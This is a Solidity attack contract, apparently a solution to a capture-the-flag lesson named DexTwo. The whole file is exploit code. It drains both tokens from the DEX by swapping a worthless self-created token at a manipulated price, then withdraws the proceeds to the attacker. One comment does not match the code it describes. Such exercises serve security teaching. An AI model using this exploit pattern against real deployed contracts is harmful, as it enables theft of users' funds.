// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../lessons/23-DexTwo.sol";

contract DexTwoAttack {
    DexTwo dexTwo;
    address public owner;
    address public myToken;

    constructor(address dexAddress) public {
        dexTwo = DexTwo(dexAddress);
        owner = msg.sender;
    }

    function attack() public {
        require(myToken != address(0), "Set myToken state variable");

        // check this contract is funded appropriately
        SwappableTokenTwo myTokenContract = SwappableTokenTwo(myToken);
        uint256 myTokenBalance = myTokenContract.balanceOf(address(this));
        require(myTokenBalance > 0, "Fund this contract with some tokens");

        // approve dexTwo to spend myToken
        myTokenContract.approve(address(this), address(dexTwo), 2**256 - 1);

        // transfer half of balance to dexTwo
        myTokenContract.transfer(address(dexTwo), myTokenBalance / 4);

        // swap from worthless myToken to token1 such that amount = entire dexTwo balance
        // this results in receiving all token1 tokens from dexTwo
        address token1 = dexTwo.token1();
        uint256 amount = myTokenContract.balanceOf(address(dexTwo));
        dexTwo.swap(myToken, token1, amount);

        // do the same for token2
        address token2 = dexTwo.token2();
        amount = myTokenContract.balanceOf(address(dexTwo));
        dexTwo.swap(myToken, token2, amount);

        // withdraw tokens to attacker
        withdraw();
    }

    function updateMyTokenAddress(address _myToken) public {
        myToken = _myToken;
    }

    function withdraw() internal {
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();
        SwappableTokenTwo(token1).transfer(owner, dexTwo.balanceOf(token1, address(this)));
        SwappableTokenTwo(token2).transfer(owner, dexTwo.balanceOf(token2, address(this)));
    }
}
